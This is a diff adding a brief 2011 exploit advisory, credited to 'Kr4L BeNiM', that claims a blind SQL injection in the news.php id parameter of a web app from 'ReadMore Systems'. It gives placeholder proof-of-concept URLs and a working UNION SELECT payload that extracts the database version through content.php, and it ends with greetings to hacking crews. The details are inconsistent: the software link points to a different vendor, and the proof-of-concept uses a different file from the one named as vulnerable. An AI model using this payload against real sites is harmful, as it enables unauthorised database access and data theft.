@@ -1,0 +1,27 @@
+*##############################**##############################**########
+[+] Exploit Title : ReadMore Systems Incorporated (SQL Injections)
+[+] Author : Kr4L BeNiM
+[+] Contact : KralBenimRocks [@] Gmail [.] Com
+[+] Date : November 9, 2011
+[+] Software Link:
+(http://readmoresystems.com)<http://unikscripts.com/yaxal_products.php?display=product&id=66>
+[+] Category: Web Apps [Blind SQL Injection]
+##############################**##############################**########
+Vuln:
+*
+
+*Sql injection on file News.php?id=
+
+Example:
+http://xxx.com/news.php?id=[Sql]
+
+P0C:
+http://www.site.com/news.php?id=157[sql commands]
+
+*
+
+*<http://server/content.php?id=-1+union+select+1,2,3,4,version%28%29,6,7,8,9,10,11,12,13>
+
+##############################**##############################**########
+[+] Greets : Likuid Sky, Hax.Root, SOG, TSL, CyberLeets.
+##############################**##############################**########*
